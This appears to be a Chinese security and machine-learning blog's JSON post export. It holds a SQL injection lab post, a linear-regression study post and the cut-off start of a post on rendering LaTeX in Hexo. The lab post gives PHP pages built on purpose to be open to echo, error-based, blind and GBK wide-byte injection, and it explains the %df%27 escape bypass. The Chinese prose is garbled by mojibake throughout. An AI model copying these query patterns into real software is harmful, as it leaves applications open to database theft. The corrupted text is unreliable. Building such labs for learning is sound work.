ä¹‹å„ç§æ³¨å…¥ç±»å‹çš„ç¯å¢ƒæ­å»ºå’Œä»£ç ç¼–å†™ ç¼–å†™å¸¸è§„å›æ˜¾æ³¨å…¥çš„ä»£ç ï¼Œåœ¨ä¹‹å‰æ­å»ºçš„ç¯å¢ƒä¸­æµ‹è¯•æ˜¯å¦æ­£å¸¸ï¼› ç¼–å†™æŠ¥é”™æ³¨å…¥çš„ä»£ç ï¼Œå¹¶åšç›¸åº”çš„æœåŠ¡å™¨é…ç½®æ¥æ»¡è¶³æ¡ä»¶ï¼Œå¹¶æµ‹è¯•ä»£ç æ˜¯å¦æ­£å¸¸ï¼› ç¼–å†™ç›²æ³¨çš„ä»£ç ï¼Œåœ¨ä¹‹å‰çš„æ­å»ºç¯å¢ƒä¸­æµ‹è¯•æ˜¯å¦æ­£å¸¸ï¼› ç¼–å†™å®½å­—èŠ‚æ³¨å…¥çš„ä»£ç ï¼Œå¹¶åšç›¸åº”çš„æœåŠ¡å™¨é…ç½®æ¥æ»¡è¶³æ¡ä»¶ï¼Œå¹¶æµ‹è¯•ä»£ç æ˜¯å¦æ­£å¸¸ã€‚ 0x01 å›æ˜¾æ³¨å…¥ å›æ˜¾æ³¨å…¥ä¸»è¦çš„æ˜¯å°†æŸ¥è¯¢çš„å†…å®¹è¾“å‡ºåˆ°é¡µé¢ä¸Šï¼Œè¿™æ ·æŠ¥é”™æ‰èƒ½å›æ˜¾ä¿¡æ¯ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpecho &#x27;&lt;h1&gt;&#x27;;echo &#x27;Test ErrorBased Injections&#x27;;echo &#x27;&lt;/h1&gt;&#x27;;error_reporting(E_ALL ^ E_DEPRECATED);// Connect database$conn=mysqli_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;******&#x27;);if (!conn)&#123; echo &#x27;Failed to connect to MySQL:&#x27;.mysqli_error($conn);&#125;else&#123; echo &#x27;Success to connect to MySQL&#x27;;&#125;echo &#x27;&lt;hr&gt;&#x27;;mysqli_select_db($conn, &#x27;security&#x27;) or die (&quot;Unable to connect to the database: security&quot;);mysqli_query($conn, &#x27;set names utf-8&#x27;);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123; $id=$_GET[&#x27;id&#x27;];&#125;// query sql$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;echo &#x27;SQL query:&#x27;.$sql;echo &#x27;&lt;hr&gt;&#x27;;$result=mysqli_query($conn, $sql);$row=mysqli_fetch_array($result, MYSQLI_BOTH);if ($row)&#123; echo &#x27;Your Login name:&#x27;.$row[&#x27;username&#x27;]; echo &#x27;&lt;hr&gt;&#x27;; echo &#x27;Your Password:&#x27;.$row[&#x27;password&#x27;];&#125;?&gt; 0x02 æŠ¥é”™æ³¨å…¥ æŠ¥é”™æ³¨å…¥çš„åŸå› æ˜¯mysql_errorè¿™ä¸ªå‡½æ•°å¯¼è‡´çš„ï¼Œä½œç”¨æ˜¯è¿”å›ä¸Šä¸€ä¸ªmysqlæ“ä½œäº§ç”Ÿçš„æ–‡æœ¬é”™è¯¯ä¿¡æ¯ã€‚ æŠ¥é”™æ³¨å…¥çš„å‰æï¼šé¡µé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºä½ï¼Œä½†æ˜¯æœ‰sqlè¯­å¥æ‰§è¡Œé”™è¯¯ä¿¡æ¯è¾“å‡ºã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpecho &#x27;&lt;h1&gt;&#x27;;echo &#x27;Test ErrorBased Injections&#x27;;echo &#x27;&lt;/h1&gt;&#x27;;// Connect database$conn=mysqli_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;******&#x27;);if (!conn)&#123; echo &#x27;Failed to connect to MySQL:&#x27;.mysqli_error($conn);&#125;else&#123; echo &#x27;Success to connect to MySQL&#x27;;&#125;echo &#x27;&lt;hr&gt;&#x27;;mysqli_select_db($conn, &#x27;security&#x27;) or die (&quot;Unable to connect to the database: security&quot;);mysqli_query($conn, &#x27;set names utf-8&#x27;);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123; $id=$_GET[&#x27;id&#x27;];&#125;// query sql$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;echo &#x27;SQL query:&#x27;.$sql;echo &#x27;&lt;hr&gt;&#x27;;$result=mysqli_query($conn, $sql);$row=mysqli_fetch_array($result, MYSQLI_BOTH);if ($row)&#123; echo &#x27;Your Login name:&#x27;.$row[&#x27;username&#x27;]; echo &#x27;&lt;hr&gt;&#x27;; echo &#x27;Your Password:&#x27;.$row[&#x27;password&#x27;];&#125;else&#123; print_r(mysqli_error($conn));&#125;?&gt; 0x03 ç›²æ³¨ ç›²æ³¨å‰æï¼šæ²¡æœ‰æ˜¾ç¤ºä½ï¼Œä¹Ÿæ²¡æœ‰è¾“å‡ºSQLè¯­å¥æ‰§è¡Œé”™è¯¯ï¼Œåªæ˜¾ç¤ºé¡µé¢æ­£å¸¸å’Œä¸æ­£å¸¸ã€‚è¦æœ‰ä¸ªemptyå‡½æ•°æ¥åˆ¤æ–­æ˜¯å¦ä¸ºç©ºï¼Œå¦åˆ™and 1=2ä¹Ÿä¼šæ˜¾ç¤ºæ­£å¸¸é¡µé¢ã€‚ å¸ƒå°”ç›²æ³¨ 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpecho &#x27;&lt;h1&gt;&#x27;;echo &#x27;Test Bool-Blind Injections&#x27;;echo &#x27;&lt;/h1&gt;&#x27;;// Connect database$conn=mysqli_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;******&#x27;);if (!conn)&#123; echo &#x27;Failed to connect to MySQL:&#x27;.mysqli_error($conn);&#125;else&#123; echo &#x27;Success to connect to MySQL&#x27;;&#125;echo &#x27;&lt;hr&gt;&#x27;;mysqli_select_db($conn, &#x27;security&#x27;) or die (&quot;Unable to connect to the database: security&quot;);mysqli_query($conn, &#x27;set names utf-8&#x27;);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123; $id=$_GET[&#x27;id&#x27;];&#125;// query sql$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;echo &#x27;SQL query: &#x27;.$sql;echo &#x27;&lt;hr&gt;&#x27;;$result=mysqli_query($conn, $sql);$row=mysqli_fetch_array($result, MYSQLI_BOTH);if ($row)&#123; echo &#x27;You are in.........&#x27;; echo &#x27;&lt;br&gt;&#x27;;&#125;else&#123; echo &#x27;&#x27;;&#125;?&gt; æ—¶é—´ç›²æ³¨ 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpecho &#x27;&lt;h1&gt;&#x27;;echo &#x27;Test Bool-Blind Injections&#x27;;echo &#x27;&lt;/h1&gt;&#x27;;// Connect database$conn=mysqli_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;******&#x27;);if (!conn)&#123; echo &#x27;Failed to connect to MySQL:&#x27;.mysqli_error($conn);&#125;else&#123; echo &#x27;Success to connect to MySQL&#x27;;&#125;echo &#x27;&lt;hr&gt;&#x27;;mysqli_select_db($conn, &#x27;security&#x27;) or die (&quot;Unable to connect to the database: security&quot;);mysqli_query($conn, &#x27;set names utf-8&#x27;);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123; $id=$_GET[&#x27;id&#x27;];&#125;// query sql$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;echo &#x27;SQL query: &#x27;.$sql;echo &#x27;&lt;hr&gt;&#x27;;$result=mysqli_query($conn, $sql);$row=mysqli_fetch_array($result, MYSQLI_BOTH);if ($row)&#123; echo &#x27;You are in.........&#x27;; echo &#x27;&lt;br&gt;&#x27;;&#125;else&#123; echo &#x27;You are in.........&#x27;; echo &#x27;&lt;br&gt;&#x27;;&#125;?&gt; å’Œå¸ƒå°”ç›²æ³¨ä¸åŒçš„æ˜¯ï¼Œä¸è®ºæ€ä¹ˆè¾“å…¥ï¼Œå›æ˜¾çš„ä¿¡æ¯éƒ½æ˜¯ç›¸åŒçš„ã€‚ 0x04 å®½å­—èŠ‚æ³¨å…¥ å®½å­—èŠ‚å‰ææ˜¯æ•°æ®åº“ä¸­é‡‡ç”¨gbkçš„ç¼–ç æ–¹å¼ã€‚ å¦‚æœå­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼Œæˆ‘ä»¬è¾“å…¥%df%27æ—¶ï¼Œç»è¿‡è½¬è¯‘å˜æˆäº†%df%5c%27ï¼ˆ%5cæ˜¯åæ–œæ \\ï¼‰ï¼Œä¹‹ååœ¨æ•°æ®åº“æŸ¥è¯¢å‰ç”±äºä½¿ç”¨äº†GBKå¤šå­—èŠ‚ç¼–ç ï¼Œå³åœ¨æ±‰å­—ç¼–ç èŒƒå›´å†…ä¸¤ä¸ªå­—èŠ‚ä¼šè¢«ç¼–ç ä¸ºä¸€ä¸ªæ±‰å­—ã€‚ç„¶åMySQLæœåŠ¡å™¨ä¼šå¯¹æŸ¥è¯¢è¯­å¥è¿›è¡ŒGBKç¼–ç å³%df%5cè½¬æ¢æˆäº†æ±‰å­—â€œé‹â€ï¼ˆå…·ä½“è§GBKçš„æ±‰å­—ç¼–ç èŒƒå›´è§é™„å½•ï¼‰ï¼Œè€Œå•å¼•å·é€ƒé€¸äº†å‡ºæ¥ï¼Œä»è€Œé€ æˆäº†æ³¨å…¥æ¼æ´ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpecho &#x27;&lt;h1&gt;&#x27;;echo &#x27;Test ErrorBased Injections&#x27;;echo &#x27;&lt;/h1&gt;&#x27;;error_reporting(E_ALL ^ E_DEPRECATED);// Connect database$conn=mysqli_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;*****&#x27;);if (!conn)&#123; echo &#x27;Failed to connect to MySQL:&#x27;.mysqli_error($conn);&#125;else&#123; echo &#x27;Success to connect to MySQL&#x27;;&#125;echo &#x27;&lt;hr&gt;&#x27;;mysqli_select_db($conn, &#x27;security&#x27;) or die (&quot;Unable to connect to the database: security&quot;);mysqli_query($conn, &#x27;set names gbk&#x27;);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123; $id = addslashes($_GET[&#x27;id&#x27;]);&#125;// query sql$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;echo &#x27;SQL query:&#x27;.$sql;echo &#x27;&lt;hr&gt;&#x27;;$result=mysqli_query($conn, $sql);$row=mysqli_fetch_array($result, MYSQLI_BOTH);if ($row)&#123; echo &#x27;Your Login name:&#x27;.$row[&#x27;username&#x27;]; echo &#x27;&lt;hr&gt;&#x27;; echo &#x27;Your Password:&#x27;.$row[&#x27;password&#x27;];&#125;?&gt;","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://ca0y1h.top/tags/SQL%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Machine-Learning-Week2","date":"2019-10-29T08:07:41.000Z","path":"Machine_learning/basic_learning/2.Machine-Learning-Week2/","text":"Machine-Learning-Week2 å¤šå…ƒçº¿æ€§å›å½’ åœ¨ä¸Šä¸€å‘¨æˆ‘ä»¬å­¦äº†å•å˜é‡çº¿æ€§å›å½’æ–¹ç¨‹åŠå…¶æ¢¯åº¦ä¸‹é™ç®—æ³•ã€‚ä½†åœ¨å®é™…è¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œç‰¹å¾è‚¯å®šæ˜¯å¤šæ ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ ¹æ®å•å˜é‡çº¿æ€§å›å½’æ–¹ç¨‹æ¨æ¼”å‡ºå¤šå…ƒçº¿æ€§å›å½’æ–¹ç¨‹ã€‚æ¯”å¦‚è¯´ï¼Œä¸€ä¸ªäºŒæ‰‹æˆ¿çš„ä»·æ ¼å¯èƒ½ä¼šç”±æˆ¿å±‹é¢ç§¯ï¼ˆSizeï¼‰ã€æˆ¿é—´æ•°é‡ï¼ˆNumber of bedroomsï¼‰ã€æ¥¼å±‚æ•°ï¼ˆNumber of floorï¼‰ã€æˆ¿å±‹å¹´é™ï¼ˆAge of homeï¼‰è¿™å››ä¸ªç‰¹å¾å†³å®šï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š x(i)è¡¨ç¤ºç¬¬iæ¡è®­ç»ƒæ ·æœ¬ï¼Œx(i)jè¡¨ç¤ºç¬¬iæ¡è®­ç»ƒæ ·æœ¬çš„ç¬¬jä¸ªç‰¹å¾ã€‚ æ‰€ä»¥æˆ‘ä»¬å¾—åˆ°çš„çº¿æ€§å›å½’å‡½æ•°ä¸ºï¼š $$ h_\\theta (x) = \\theta_0 + \\theta_1 x_1 + \\theta_2 x_2 + \\theta_3 x_3 + \\cdots + \\theta_n x_n $$ å¦‚æœæŠŠè¯¥å‡½æ•°çš„å‚æ•° Î¸ å’Œå˜é‡ x å…¨éƒ¨å†™æˆå‘é‡çš„å½¢å¼ï¼Œå¹¶ä¸”ä¸å¦¨å‡è®¾x0=1å°±å¯ä»¥ç®€åŒ–æˆä¸‹é¢è¿™ä¸ªå‡½æ•°ï¼š $$ \\begin{align*}h_\\theta(x) =\\begin{bmatrix}\\theta_0 \\hspace{2em} \\theta_1 \\hspace{2em} â€¦ \\hspace{2em} \\theta_n\\end{bmatrix}\\begin{bmatrix}x_0 \\newline x_1 \\newline \\vdots \\newline x_n\\end{bmatrix}= \\theta^T x\\end{align*} $$ è¿›ä¸€æ­¥æ¥è®²ï¼Œå¦‚æœæˆ‘ä»¬æŠŠä¸Šå›¾çš„è®­ç»ƒæ ·æœ¬é€è¡Œçš„å†™åˆ°çŸ©é˜µå½“ä¸­ï¼Œä¸”è®°ä¸ºXï¼Œå³ï¼ˆå‡è®¾åªæœ‰ä¸‰æ¡æ•°æ®ï¼‰ï¼š $$ \\begin{align*}X = \\begin{bmatrix}x^{(1)}_0 &amp; x^{(1)}_1 &amp; x^{(1)}_2 &amp; x^{(1)}_3 &amp; x^{(1)}_4 \\newline x^{(2)}_0 &amp; x^{(2)}_1 &amp; x^{(2)}_2 &amp; x^{(2)}_3 &amp; x^{(2)}_4 \\newline x^{(3)}_0 &amp; x^{(3)}_1 &amp; x^{(3)}_2 &amp; x^{(3)}_3 &amp; x^{(3)}_4 \\end{bmatrix}&amp;,\\theta = \\begin{bmatrix}\\theta_0 \\newline \\theta_1 \\newline \\theta_2 \\newline \\theta_3 \\newline \\theta_4 \\newline\\end{bmatrix}\\end{align*} $$ é‚£ä¹ˆå‡è®¾å‡½æ•°å°±å¯ä»¥å†™ä¸ºï¼š hÎ¸(X)=XÎ¸ å¾—åˆ°çš„ç»“æœå°±æ˜¯ä¸€ä¸ªm*1çš„å‘é‡ã€‚ å¤šå…ƒæ¢¯åº¦ä¸‹é™ ä¸Šä¸€ç¯‡å­¦ä¼šäº†å•å˜é‡çš„æ¢¯åº¦ä¸‹é™ç®—æ³•ï¼Œå¯¹äºå¤šå…ƒæ¢¯åº¦ä¸‹é™ç®—æ³•ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªç…§è‘«èŠ¦ç”»ç“¢çš„è¿‡ç¨‹äº†ï¼š $$ \\begin{align*} &amp; \\text{repeat until convergence:} ; \\lbrace \\newline ; &amp; \\theta_0 := \\theta_0 - \\alpha \\frac{1}{m} \\sum\\limits_{i=1}^{m} (h_\\theta(x^{(i)}) - y^{(i)}) \\cdot x_0^{(i)}\\newline ; &amp; \\theta_1 := \\theta_1 - \\alpha \\frac{1}{m} \\sum\\limits_{i=1}^{m} (h_\\theta(x^{(i)}) - y^{(i)}) \\cdot x_1^{(i)} \\newline ; &amp; \\theta_2 := \\theta_2 - \\alpha \\frac{1}{m} \\sum\\limits_{i=1}^{m} (h_\\theta(x^{(i)}) - y^{(i)}) \\cdot x_2^{(i)} \\newline &amp; \\cdots \\newline \\rbrace \\end{align*} $$ å³ï¼š $$ \\begin{align*}&amp; \\text{repeat until convergence:} ; \\lbrace \\newline ; &amp; \\theta_j := \\theta_j - \\alpha \\frac{1}{m} \\sum\\limits_{i=1}^{m} (h_\\theta(x^{(i)}) - y^{(i)}) \\cdot x_j^{(i)} ; &amp; \\text{for j := 0â€¦n}\\newline \\rbrace\\end{align*} $$ ç‰¹å¾æ”¾ç¼©å’Œå½’ä¸€åŒ– å¦‚æœä½ æƒ³é¢„æµ‹æˆ¿ä»·ï¼Œç°åœ¨æœ‰ä¸¤ä¸ªå˜é‡ x1 å’Œ x2 æ¥ä½œä¸ºç‰¹å¾ï¼Œå…¶ä¸­ x1 ä¸ºæˆ¿å­çš„å¤§å°ï¼ŒèŒƒå›´åœ¨ 0 åˆ° 2000ï¼Œx2 ä¸ºæˆ¿å­ä¸­å§å®¤çš„æ•°ç›®ï¼ŒèŒƒå›´åœ¨ 0 åˆ° 5ï¼Œé‚£ä¹ˆç”»å‡ºè¿™ä¸ªä»£ä»·å‡½æ•°çš„è½®å»“å›¾å°±æ˜¯è¿™ä¸ªæ ·å­ï¼Œä¸€ä¸ªæ‰æ‰çš„æ¤­åœ†å½¢ï¼š å¯¹è¿™ä¸ªå‡½æ•°è¿›è¡Œæ¢¯åº¦ä¸‹é™ï¼Œå°±æ˜¯é€”ä¸­è“çº¿çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªè·¯ç¨‹å¾ˆé•¿å¾ˆæ›²æŠ˜ï¼Œè¿™æ ·æˆ‘ä»¬è¿›è¡Œæ¢¯åº¦ä¸‹é™æ‰€èŠ±è´¹çš„æ—¶é—´å°±ä¼šå¾ˆé•¿ã€‚ ä¸ºäº†ä½¿ç‰¹å¾å€¼åœ¨ä¸€ä¸ªç›¸ä¼¼çš„èŒƒå›´å†…å˜åŒ–ï¼ˆæ¯”å¦‚-1åˆ°+1ä¹‹é—´ï¼‰ï¼Œå¯ä»¥å°†å˜é‡è¿›è¡Œç‰¹å¾æ”¾ç¼©ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä½†æ˜¯åˆå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œä½ ä¼šå‘ç°ï¼Œç°åœ¨ç»è¿‡å¤„ç†ä¹‹åçš„æ•°æ®å…¨æ˜¯æ­£å€¼ï¼Œä¸åˆ†æ•£ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦ç”¨ç¨å¾®å¤æ‚ä¸€ç‚¹çš„æ–¹æ³•è¿›è¡Œç‰¹å¾ç¼©æ”¾ã€‚ç”¨**å‡å€¼å½’ä¸€åŒ–ï¼ˆMean normalizationï¼‰**çš„æ–¹æ³•å¤„ç†æ•°æ®ï¼š $$ x_n = \\frac{x_n - Î¼_n}{s_n} $$ å…¶ä¸­ Î¼n ä¸ºå¹³å‡å€¼ï¼ŒSn ä¸ºæ ‡å‡†å·®ï¼Œä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªå˜é‡æœ€å¤§å€¼ä¸æœ€å°å€¼çš„å·®ã€‚ç°åœ¨ä½ å°±ä¼šå‘ç°ï¼Œæ•°æ®æ—¢æœ‰æ­£å€¼ä¹Ÿæœ‰è´Ÿå€¼ï¼Œåˆ†æ•£åœ¨-1 åˆ° 1 è¿™ä¸ªåŒºé—´ï¼Œè¿›è¡Œæ¢¯åº¦ä¸‹é™å°±ä¼šå¾ˆå¿«ã€‚ è¿­ä»£çš„æœ‰æ•ˆæ€§ æˆ‘ä»¬çŸ¥é“æ¢¯åº¦ä¸‹é™ç®—æ³•æ˜¯ä¸€ä¸ªé€’å½’çš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•ç¡®å®šè¿™ä¸ªé€’å½’çš„æ–¹å‘æ˜¯æ­£ç¡®çš„å‘¢ï¼Ÿè§†é¢‘ä¸­ç»™å‡ºäº†ä¸¤ç§æ–¹æ³•ã€‚ Debugging gradient descent ä»¥Xè½´ä¸ºè¿­ä»£æ¬¡æ•°ï¼ŒYè½´ä¸ºæ¯æ¬¡è¿­ä»£çš„ä»£ä»·å‡½æ•°å€¼æ¥ä½œå›¾ï¼Œå¦‚æœå›¾åƒæ˜¯ä¸€ä¸ªä¸‹é™çš„è¿‡ç¨‹ï¼Œå¹¶åœ¨æœ€åè¶‹äºå¹³ç¼“ï¼Œé‚£ä¹ˆè¿™ç§è¿­ä»£æ˜¯æœ‰æ•ˆçš„ã€‚å¦‚æœå›¾åƒæ˜¯ä¸€ä¸ªä¸Šå‡çš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆåº”è¯¥è¯•ç€å‡å°Î±çš„å€¼ã€‚ Automatic convergence test é€šè¿‡è®¾å®šä¸€ä¸ªé˜ˆå€¼Îµï¼ˆæ¯”å¦‚Îµ=10-3ï¼‰ï¼Œå¦‚æœæ¯æ¬¡è¿­ä»£ä¹‹åï¼Œä»£ä»·å‡½æ•°çš„å‡å°‘é‡å°äºé˜ˆå€¼Îµï¼Œé‚£ä¹ˆå°±è®¤å®šè¿­ä»£æ˜¯æœ‰æ•ˆçš„ã€‚ä½†æ˜¯è¿™ç§æ–¹æ³•åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¹¶ä¸å¤ªå®¹æ˜“å»ç¡®å®šé˜ˆå€¼Îµã€‚ å¤šé¡¹å¼å›å½’æ–¹ç¨‹ å¦‚æœå‡è®¾å‡½æ•°ä¸èƒ½å¾ˆå¥½åœ°æ‹Ÿåˆæ•°æ®ï¼Œåˆ™å®ƒä¸ä¸€å®šå¿…é¡»æ˜¯ä¸€ä¸ªçº¿æ€§çš„ï¼ˆç›´çº¿ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†å…¶è®¾ä¸ºäºŒæ¬¡ï¼Œä¸‰æ¬¡æˆ–å¹³æ–¹æ ¹å‡½æ•°ï¼ˆæˆ–ä»»ä½•å…¶ä»–å½¢å¼ï¼‰æ¥æ›´æ”¹å‡è®¾å‡½æ•°çš„è¡Œä¸ºã€‚æ¯”å¦‚è¯´æ ¹æ®é¢ç§¯çš„å¤§å°æ¥é¢„æµ‹æˆ¿ä»·ï¼Œå¦‚æœç»™å®šçš„æ•°æ®é›†å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŠŠå‡è®¾å‡½æ•°å˜ä¸ºä¸‰æ¬¡å‡½æ•°æˆ–å¹³æ–¹æ ¹å‡½æ•°ï¼ˆå› ä¸ºäºŒæ¬¡å‡½æ•°åœ¨æœ€å¤§å€¼ä¹‹åä¼šä¸‹é™ï¼Œè¿™ä¸ç¬¦åˆå®é™…æƒ…å†µï¼‰,å³ï¼š $$ h_\\theta(x) = \\theta_0 + \\theta_1 x_1 + \\theta_2 x_1^2 + \\theta_3 x_1^3 $$ æˆ–è€…ï¼š $$ h_\\theta (x) = \\theta_0 + \\theta_1 x_1 + \\theta_2 \\sqrt {x_1} $$ è¿™ä¸ªæ—¶å€™ç‰¹å¾æ”¾ç¼©å°±æ˜¾å¾—å°¤ä¸ºé‡è¦ã€‚ æ­£è§„æ–¹ç¨‹ï¼ˆNormal Equationï¼‰ â€œæ­£è§„æ–¹ç¨‹â€æ˜¯ä¸€ç§æ— éœ€è¿­ä»£å³å¯æ‰¾åˆ°æœ€ä½³Î¸çš„æ–¹æ³•ï¼Œå…¬å¼å¦‚ä¸‹ï¼š $$ \\theta = (X^T X)^{-1} X^T y $$ æ— éœ€å¯¹æ­£è§„æ–¹ç¨‹è¿›è¡Œç‰¹å¾ç¼©æ”¾ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œè¿˜æ˜¯æ±‚æˆ¿ä»·ï¼Œç°åœ¨æœ‰ 4 ç»„è®­ç»ƒé›†ï¼Œå¦‚ä¸‹è¡¨ï¼š åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒçŸ©é˜µXä¸ºï¼š $$ \\begin{align*}X = \\begin{bmatrix}1 &amp; 2014 &amp; 5 &amp; 1 &amp; 45 \\newline 1 &amp; 1416 &amp; 3 &amp; 2 &amp; 40 \\newline 1 &amp; 1534 &amp; 3 &amp; 2 &amp; 40 \\newline 1 &amp; 852 &amp; 2 &amp; 1 &amp;36 \\end{bmatrix} \\end{align*} $$ å‘é‡yä¸ºï¼š $$ \\begin{align*} y = \\begin{bmatrix} 460 \\newline 232 \\newline 315 \\newline 178 \\end{bmatrix} \\end{align*} $$ è¿™æ ·é€šè¿‡æ­£è§„æ–¹ç¨‹å°±å¯ä»¥å¾ˆå®¹æ˜“åœ°æ±‚å‡ºå‚æ•° Î¸ï¼ˆä¸€å®šè¦æ³¨æ„ï¼Œè¿™é‡Œçš„å‚æ•° Î¸ æ˜¯ä¸€ä¸ªå‘é‡ï¼‰ã€‚ æ—¢ç„¶æ±‚å‚æ•° Î¸ æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ä¸ªä¸ºæ¢¯åº¦ä¸‹é™æ³•ï¼Œä¸€ä¸ªä¸ºæ­£è§„æ–¹ç¨‹ï¼Œé‚£ä¹ˆä»–ä¿©ä¹‹é—´ä¸€å®šä¼šæœ‰ä¼˜ç¼ºç‚¹ï¼Œä¸‹è¡¨å°±æ˜¯è¿™ä¸¤ç§æ–¹æ³•çš„ä¼˜ç¼ºç‚¹çš„å¯¹æ¯”ï¼š æ¢¯åº¦ä¸‹é™ æ­£è§„æ–¹ç¨‹ éœ€è¦é€‰æ‹©å­¦ä¹ é€Ÿç‡Î± ä¸éœ€è¦é€‰æ‹©å­¦ä¹ é€Ÿç‡ éœ€è¦è¿­ä»£ ä¸éœ€è¦è¿­ä»£ æ—¶é—´å¤æ‚åº¦O (kn2) O (n3), éœ€è¦è®¡ç®—XTXçš„é€†çŸ©é˜µ å½“ç‰¹å¾å€¼å¾ˆå¤šçš„æ—¶å€™ï¼Œæ•ˆç‡ä¹Ÿå¾ˆé«˜ å½“ç‰¹å¾å€¼å¾ˆå¤šçš„æ—¶å€™ï¼Œæ•ˆç‡å¾ˆä½ï¼ˆè¦æ±‚é€†çŸ©é˜µï¼‰ æ—¢ç„¶è¦æ±‚é€†çŸ©é˜µï¼Œé‚£ä¹ˆå°±è‚¯å®šä¼šå‡ºç°XTXä¸å¯é€†çš„æ—¶å€™ã€‚ ç¬¬ä¸€ç§æƒ…å†µï¼š å‡ºç°äº†ä¸¤ä¸ªç›¸ä¼¼çš„ç‰¹å¾ï¼Œè¿™ä¸ªä¸¤ä¸ªç‰¹å¾å¯ä»¥ç”¨ä¸€ä¸ªçº¿æ€§å…³ç³»è¿›è¡Œè¡¨ç¤ºã€‚ä¾‹å¦‚ï¼Œç±³å’Œè‹±å°ºï¼Œè¿™ä¸¤ä¸ªéƒ½æ˜¯ç”¨æ¥æè¿°é•¿åº¦çš„å•ä½ï¼Œä¸”ä»–ä»¬ä¹‹é—´å¯ä»¥è¿›è¡Œç›¸äº’è½¬åŒ–ï¼Œå¦‚æœç‰¹å¾å€¼åŒæ—¶å‡ºç°ä»–ä»¬ä¸¤ä¸ªï¼Œå°±ä¼šå‡ºç°çŸ©é˜µä¸å¯é€†çš„æƒ…å†µã€‚ è§£å†³æ–¹æ³•ï¼šå»æ‰ä»»æ„ä¸€ä¸ªå³å¯ã€‚ ç¬¬äºŒç§æƒ…å†µï¼šç‰¹å¾å€¼çš„æ•°é‡ç‰¹åˆ«å¤šï¼Œä½†æ˜¯æ•°æ®é›†çš„æ•°é‡ç‰¹åˆ«å°‘ã€‚ è§£å†³æ–¹æ³•ï¼šå¢åŠ æ•°æ®é›†æˆ–å‡å°‘ç‰¹å¾å€¼ã€‚","tags":[{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"http://ca0y1h.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"çº¿æ€§å›å½’","slug":"çº¿æ€§å›å½’","permalink":"http://ca0y1h.top/tags/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"}],"categories":[{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"åŸºç¡€å…¥é—¨","slug":"æœºå™¨å­¦ä¹ /åŸºç¡€å…¥é—¨","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"Hexoæ¸²æŸ“LaTeXæ•°å­¦å…¬å¼","date":"2019-10-26T06:01:20.000Z","path":"Other/3.Hexoæ¸²æŸ“LaTeXæ•°å­¦å…¬å¼/","text":"Hexoæ¸²æŸ“LaTeXæ•°å­¦å…¬å¼ æœ€è¿‘åœ¨è·Ÿç€å´æ©è¾¾æ•™æˆåœ¨Courseraç½‘ç«™ä¸Šçš„è¯¾ç¨‹å­¦ä¹ æœºå™¨å­¦ä¹ 